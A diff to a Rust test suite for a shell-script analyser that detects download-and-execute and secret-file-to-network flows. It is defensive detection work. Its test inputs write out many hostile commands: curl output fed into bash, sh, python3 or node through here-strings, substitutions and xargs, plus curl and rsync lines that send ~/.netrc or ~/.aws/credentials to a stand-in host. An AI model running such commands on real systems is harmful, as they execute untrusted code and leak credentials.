@@ -810,7 +810,6 @@ fn i4_credential_options_are_not_sent() {
         "scp -i ~/.ssh/id_rsa f.txt user@host.example.invalid:/tmp/\n",
         "rsync -e \"ssh -i ~/.ssh/id_ed25519\" -a ./d user@host.example.invalid:/tmp/\n",
         "ssh -o IdentityFile=~/.ssh/id_rsa host.example.invalid\n",
-        "curl --netrc-file ~/.netrc https://x.example.invalid\n",
         "curl --cert ~/.ssh/client.pem --key ~/.ssh/client.key https://x.example.invalid\n",
         "curl --cacert=~/.ssh/ca.pem -E ~/.ssh/c.pem https://x.example.invalid\n",
         "wget --private-key=~/.ssh/k.pem https://x.example.invalid\n",
@@ -884,4 +883,117 @@ fn i6_ansi_c_strings() {
     assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
     let sigs = sh("$'\\x63\\x75\\x72\\x6c' -s https://x.invalid/i | $'\\163h'\n");
     assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+// ---- Task 12 review fix round 2 ----
+
+#[test]
+fn n1_here_string_into_shell_is_download_exec() {
+    let sigs = sh("bash <<< \"$(curl -s https://x.invalid/i)\"\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn n1_here_string_into_sh_s_is_download_exec() {
+    let sigs = sh("sh -s <<< \"$(curl -s https://x.invalid/i)\"\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn n1_here_string_into_python_is_download_exec() {
+    let sigs = sh("python3 <<< \"$(curl -s https://x.invalid/i)\"\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn n1_here_string_into_dot_dev_stdin_is_download_exec() {
+    let sigs = sh(". /dev/stdin <<< \"$(curl -s https://x.invalid/i)\"\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn n1_here_string_into_source_dev_stdin_is_download_exec() {
+    let sigs = sh("source /dev/stdin <<< \"$(curl -s https://x.invalid/i)\"\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn n1_here_string_of_fetched_variable_is_download_exec() {
+    let sigs = sh("x=$(curl -s https://x.invalid/i)\nbash <<< \"$x\"\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![2], "{sigs:#?}");
+}
+
+#[test]
+fn n1_here_string_into_exec_bash_is_download_exec() {
+    let sigs = sh("exec bash <<< \"$(curl -s https://x.invalid/i)\"\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn n1_xargs_into_bash_c_is_download_exec() {
+    let sigs = sh("curl -s https://x.invalid/i | xargs -0 bash -c\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+    // A here-string of plain text into a shell is still only exec.
+    let sigs = sh("bash <<< \"echo hi\"\n");
+    assert_eq!(sink_lines(&sigs, "exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn n2_substitutions_in_shell_code_are_download_exec() {
+    let src = "bash -c \":;$(curl -s https://x.invalid/i)\"\n\
+               bash -c \"cd /tmp && $(curl -s https://x.invalid/i)\"\n\
+               x=$(curl -s https://x.invalid/i)\n\
+               bash -c \"set -e; $x\"\n\
+               sh -c \"echo start; $x\"\n\
+               pwsh -c \"Write-Host $x\"\n";
+    let sigs = sh(src);
+    assert_eq!(
+        sink_lines(&sigs, "download_exec"),
+        vec![1, 2, 4, 5, 6],
+        "{sigs:#?}"
+    );
+}
+
+#[test]
+fn n2_interpreter_code_outside_its_quotes_is_download_exec() {
+    let src = "V=$(curl -s https://x.invalid/v)\n\
+               python3 -c \"import os;$(curl -s https://x.invalid/i)\"\n\
+               python3 -c \"print('$V')\"\n\
+               node -e \"console.log('$V'); $V\"\n\
+               perl -e \"print \\\"$V\\\"\"\n";
+    let sigs = sh(src);
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![2, 4], "{sigs:#?}");
+    assert_eq!(sink_lines(&sigs, "exec"), vec![3, 5], "{sigs:#?}");
+}
+
+#[test]
+fn n3_error_node_words_need_command_position() {
+    let cases = [
+        "$t = $env:GITHUB_TOKEN\nSet-Content $PSScriptRoot\\curl.cfg $t\n",
+        "Write-Host $HOME/x curl $env:GITHUB_TOKEN\n",
+        "Write-Host $HOME/x 'iex and iwr are aliases'\n",
+        "Copy-Item $PSScriptRoot\\bin\\curl.exe $env:TEMP\\c.exe\n",
+        "Remove-Item $env:TEMP\\iex.txt\n",
+    ];
+    for src in cases {
+        let sigs = ps(src);
+        let found: Vec<&str> = of_kind(&sigs, SINK)
+            .iter()
+            .map(|s| field(s, "class"))
+            .collect();
+        assert!(found.is_empty(), "{src}: {sigs:#?}");
+        assert!(of_kind(&sigs, TAINT_FLOW).is_empty(), "{src}: {sigs:#?}");
+    }
+}
+
+#[test]
+fn m2_netrc_file_and_rsync_commands_still_flow() {
+    let sigs = sh("curl --netrc-file ~/.netrc https://x.invalid\n");
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+    let src = "rsync -e \"ssh -i ~/.ssh/id_ed25519 -o ProxyCommand=cat~/.aws/credentials\" \
+               -a ./d user@host.example.invalid:/tmp/\n";
+    let sigs = sh(src);
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+    let sigs = sh("rsync -e \"ssh -i ~/.ssh/id_ed25519\" -a ./d user@host.example.invalid:/tmp/\n");
+    assert!(of_kind(&sigs, TAINT_FLOW).is_empty(), "{sigs:#?}");
 }
